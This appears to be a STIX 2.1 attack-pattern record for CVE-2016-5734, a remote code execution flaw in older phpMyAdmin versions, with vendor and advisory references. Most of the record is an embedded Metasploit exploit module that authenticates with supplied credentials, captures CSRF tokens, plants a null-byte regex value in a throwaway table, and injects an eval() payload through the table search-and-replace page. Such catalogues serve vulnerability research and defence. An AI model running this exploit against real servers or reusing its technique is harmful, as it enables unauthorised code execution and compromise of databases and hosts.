{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c8191778-a671-4110-9bad-321bdcf620c8",
    "created": "2024-08-14T17:07:54.630396Z",
    "modified": "2024-08-14T17:07:54.6304Z",
    "name": "phpMyAdmin Authenticated Remote Code Execution",
    "description": " phpMyAdmin 4.0.x before 4.0.10.16, 4.4.x before 4.4.15.7, and 4.6.x before 4.6.3 does not properly choose delimiters to prevent use of the preg_replace (aka eval) modifier, which might allow remote attackers to execute arbitrary PHP code via a crafted string, as demonstrated by the table search-and-replace implementation. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/phpmyadmin_null_termination_exec.rb",
            "external_id": "phpmyadmin_null_termination_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-5734"
        },
        {
            "source_name": "reference",
            "url": "https://www.phpmyadmin.net/security/PMASA-2016-27/"
        },
        {
            "source_name": "reference",
            "url": "https://security.gentoo.org/glsa/201701-32"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'phpMyAdmin Authenticated Remote Code Execution',\n      'Description'     => %q{\n        phpMyAdmin 4.0.x before 4.0.10.16, 4.4.x before 4.4.15.7, and 4.6.x before\n        4.6.3 does not properly choose delimiters to prevent use of the preg_replace\n        (aka eval) modifier, which might allow remote attackers to execute arbitrary\n        PHP code via a crafted string, as demonstrated by the table search-and-replace\n        implementation.\n      },\n      'Author' =>\n        [\n          'Michal \u010ciha\u0159 and Cure53', # Discovery\n          'Matteo Cantoni <goony[at]nothink.org>' # Metasploit Module\n        ],\n      'License'         => MSF_LICENSE,\n      'References'      =>\n        [\n          [ 'BID', '91387' ],\n          [ 'CVE', '2016-5734' ],\n          [ 'CWE', '661' ],\n          [ 'URL', 'https://www.phpmyadmin.net/security/PMASA-2016-27/' ],\n          [ 'URL', 'https://security.gentoo.org/glsa/201701-32' ],\n          [ 'EDB', '40185' ],\n        ],\n      'Privileged'  => true,\n      'Platform'  => [ 'php' ],\n      'Arch'  => ARCH_PHP,\n      'Payload' =>\n        {\n          'BadChars' => \"&\\n=+%\",\n        },\n      'Targets' =>\n        [\n          [ 'Automatic', {} ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2016-06-23'))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, \"Base phpMyAdmin directory path\", '/phpmyadmin/']),\n        OptString.new('USERNAME', [ true, \"Username to authenticate with\", 'root']),\n        OptString.new('PASSWORD', [ false, \"Password to authenticate with\", '']),\n        OptString.new('DATABASE', [ true, \"Existing database at a server\", 'phpmyadmin'])\n      ])\n  end\n\n  def check\n    begin\n      res = send_request_cgi({ 'uri' => normalize_uri(target_uri.path, '/js/messages.php') })\n    rescue\n      print_error(\"#{peer} - Unable to connect to server\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    if res.nil? || res.code != 200\n      print_error(\"#{peer} - Unable to query /js/messages.php\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    # PHP 4.3.0-5.4.6\n    # PHP > 5.4.6 not exploitable because null byte in regexp warning\n    php_version = res['X-Powered-By']\n    if php_version\n      vprint_status(\"#{peer} - PHP version: #{php_version}\")\n\n      if php_version =~ /PHP\\/(\\d+\\.\\d+\\.\\d+)/\n        version = Rex::Version.new($1)\n        vprint_status(\"#{peer} - PHP version: #{version.to_s}\")\n        if version > Rex::Version.new('5.4.6')\n          return Exploit::CheckCode::Safe\n        end\n      end\n    else\n      vprint_status(\"#{peer} - Unknown PHP version\")\n    end\n\n    # 4.3.0 - 4.6.2 authorized user RCE exploit\n    if res.body =~ /pmaversion = '(\\d+\\.\\d+\\.\\d+)';/\n      version = Rex::Version.new($1)\n      vprint_status(\"#{peer} - phpMyAdmin version: #{version.to_s}\")\n\n      if version >= Rex::Version.new('4.3.0') and version <= Rex::Version.new('4.6.2')\n        return Exploit::CheckCode::Appears\n      elsif version < Rex::Version.new('4.3.0')\n        return Exploit::CheckCode::Detected\n      end\n      return Exploit::CheckCode::Safe\n    end\n\n    return Exploit::CheckCode::Unknown\n  end\n\n  def exploit\n    return unless check == Exploit::CheckCode::Appears\n\n    uri = target_uri.path\n    vprint_status(\"#{peer} - Grabbing CSRF token...\")\n\n    response = send_request_cgi({ 'uri' => uri})\n\n    if response.nil?\n      fail_with(Failure::NotFound, \"#{peer} - Failed to retrieve webpage grabbing CSRF token\")\n    elsif (response.body !~ /\"token\"\\s*value=\"([^\"]*)\"/)\n      fail_with(Failure::NotFound, \"#{peer} - Couldn't find token. Is URI set correctly?\")\n    end\n\n    token = $1\n    vprint_status(\"#{peer} - Retrieved token #{token}\")\n\n    vprint_status(\"#{peer} - Authenticating...\")\n    login = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(uri, 'index.php'),\n      'vars_post' => {\n        'token' => token,\n        'pma_username' => datastore['USERNAME'],\n        'pma_password' => datastore['PASSWORD']\n      }\n    })\n\n    if login.nil?\n      fail_with(Failure::NotFound, \"#{peer} - Failed to retrieve webpage\")\n    elsif login.redirect?\n      token = login.redirection.to_s.scan(/token=(.*)[&|$]/).flatten.first\n    else\n      fail_with(Failure::NotFound, \"#{peer} - Couldn't find token. Wrong phpMyAdmin version?\")\n    end\n\n    cookies = login.get_cookies\n\n    login_check = send_request_cgi({\n      'uri' => normalize_uri(uri, 'index.php'),\n      'vars_get' => { 'token' => token },\n      'cookie' => cookies\n    })\n\n    if login_check.nil?\n      fail_with(Failure::NotFound, \"#{peer} - Failed to retrieve webpage\")\n    elsif login_check.body =~ /Welcome to/\n      fail_with(Failure::NoAccess, \"#{peer} - Authentication failed\")\n    end\n\n    vprint_status(\"#{peer} - Authentication successful\")\n\n    # Create random table and column\n    rand_table = Rex::Text.rand_text_alpha_lower(3+rand(3))\n    rand_column = Rex::Text.rand_text_alpha_lower(3+rand(3))\n    sql_value = '0%2Fe%00'\n\n    vprint_status(\"#{peer} - Create random table '#{rand_table}' into '#{datastore['DATABASE']}' database...\");\n\n    create_rand_table = send_request_cgi({\n      'uri' => normalize_uri(uri, 'import.php'),\n      'method' => 'POST',\n      'cookie' => cookies,\n      'encode_params' => false,\n      'vars_post' => {\n        'show_query' => '0',\n        'ajax_request' => 'true',\n        'db' => datastore['DATABASE'],\n        'pos' => '0',\n        'is_js_confirmed' => '0',\n        'fk_checks' => '0',\n        'sql_delimiter' => ';',\n        'token' => token,\n        'SQL' => 'Go',\n        'ajax_page_request' => 'true',\n        'sql_query' => \"CREATE+TABLE+`#{rand_table}`+( ++++++`#{rand_column}`+varchar(10)+CHARACTER+SET\"\\\n                    \"+utf8+NOT+NULL ++++)+ENGINE=InnoDB+DEFAULT+CHARSET=latin1; ++++INSERT+INTO+`#{rand_table}`+\"\\\n                    \"(`#{rand_column}`)+VALUES+('#{sql_value}'); ++++\",\n      }\n    })\n\n    if create_rand_table.nil? || create_rand_table.body =~ /(.*)<code>\\\\n(.*)\\\\n<\\\\\\/code>(.*)/i\n      fail_with(Failure::Unknown, \"#{peer} - Failed to create a random table\")\n    end\n\n    vprint_status(\"#{peer} - Random table created\")\n\n    # Execute command\n    command = Rex::Text.uri_encode(payload.encoded)\n\n    exec_cmd = send_request_cgi({\n      'uri' => normalize_uri(uri, 'tbl_find_replace.php'),\n      'method' => 'POST',\n      'cookie' => cookies,\n      'encode_params' => false,\n      'vars_post' =>{\n        'columnIndex' => '0',\n        'token' => token,\n        'submit' => 'Go',\n        'ajax_request' => 'true',\n        'goto' => 'sql.php',\n        'table' => rand_table,\n        'replaceWith' => \"eval%28%22#{command}%22%29%3B\",\n        'db' => datastore['DATABASE'],\n        'find' => sql_value,\n        'useRegex' => 'on'\n      }\n    })\n\n    # Remove random table\n    vprint_status(\"#{peer} - Remove the random table '#{rand_table}' from '#{datastore['DATABASE']}' database\")\n\n    rm_table = send_request_cgi({\n      'uri' => normalize_uri(uri, 'import.php'),\n      'method' => 'POST',\n      'cookie' => cookies,\n      'encode_params' => false,\n      'vars_post' => {\n        'show_query' => '0',\n        'ajax_request' => 'true',\n        'db' => datastore['DATABASE'],\n        'pos' => '0',\n        'is_js_confirmed' => '0',\n        'fk_checks' => '0',\n        'sql_delimiter' => ';',\n        'token' => token,\n        'SQL' => 'Go',\n        'ajax_page_request' => 'true',\n        'sql_query' => \"DROP+TABLE+`#{rand_table}`\"\n      }\n    })\n\n    if rm_table.nil? || rm_table.body !~ /(.*)MySQL returned an empty result set \\(i.e. zero rows\\).(.*)/i\n      print_bad(\"#{peer} - Failed to remove the table '#{rand_table}'\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-06-23",
    "x_mitre_platforms": [
        "[ 'php' ]"
    ]
}